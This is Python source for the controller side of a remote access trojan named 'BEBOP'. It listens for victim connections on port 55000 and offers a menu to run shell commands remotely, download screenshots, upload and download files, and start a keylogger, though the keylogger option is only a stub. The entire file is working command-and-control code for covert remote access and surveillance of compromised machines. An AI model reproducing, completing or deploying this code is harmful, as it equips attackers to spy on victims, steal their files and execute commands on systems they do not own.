import socket
import sys
import threading
import time
import os

address = ("0.0.0.0", 55000)

def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) Exit\n\n")

def recv(buff_size=1024):
    data_size = int(conn_to_client.recv(12).decode())

    data = bytes()
    while len(data) < data_size:
        data += conn_to_client.recv(buff_size)

    return data


def send(data):
    header_size = 12
    data_size = f"{len(data):^{header_size}}"
    conn_to_client.send(data_size.encode())
    conn_to_client.sendall(data)

def download_file(file_name, file_path=os.getcwd()):
    file_data = recv()
    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
    file.write(file_data)
    file.close()

def upload_file(file_name):
    try:
        with open(f"{file_name}", "rb") as file:
            file_data = file.read()
            send(file_data)
    except FileNotFoundError:
        print("Could not find file. Make sure file is in the same directory as this script.")
        send(b'')

def open_shell():
    while True:
        cmd = input("bebop#: ")

        if cmd == "exit":
            send(cmd.encode())
            break
        elif cmd[:2] == "dw":
            #Download
            print("Downloading...")
            send(cmd.encode())
            file_name = cmd[3:]
            download_file(file_name)
            continue

        elif cmd[:2] == "up":
            #Upload
            print("Uploading...")
            send(cmd.encode())
            file_name = cmd[3:]
            upload_file(file_name)
            continue

        send(cmd.encode())
        output = recv()
        print(output.decode())


def establish_connection(address):
    global conn_to_client
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(address)
    server.listen(0)

    print("Waiting on connections")
    conn_to_client, address = server.accept()

    if conn_to_client:
        print(f"Connection to {address[0]}:{address[1]} Established!")
    else:
        sys.exit("Failed to recieve connection to client...Exiting")

def main():
    establish_connection(address)
    while True:
        print_menu()
        choice = input("Enter Choice: ")
        send(choice.encode())

        if choice == "1":
            open_shell()

        elif choice == "2":
            download_file(file_name=f"{time.asctime()}.png")

        elif choice == "3":
            pass

        elif choice == "4":
            conn_to_client.shutdown(socket.SHUT_WR)
            conn_to_client.close()
            sys.exit()

main()
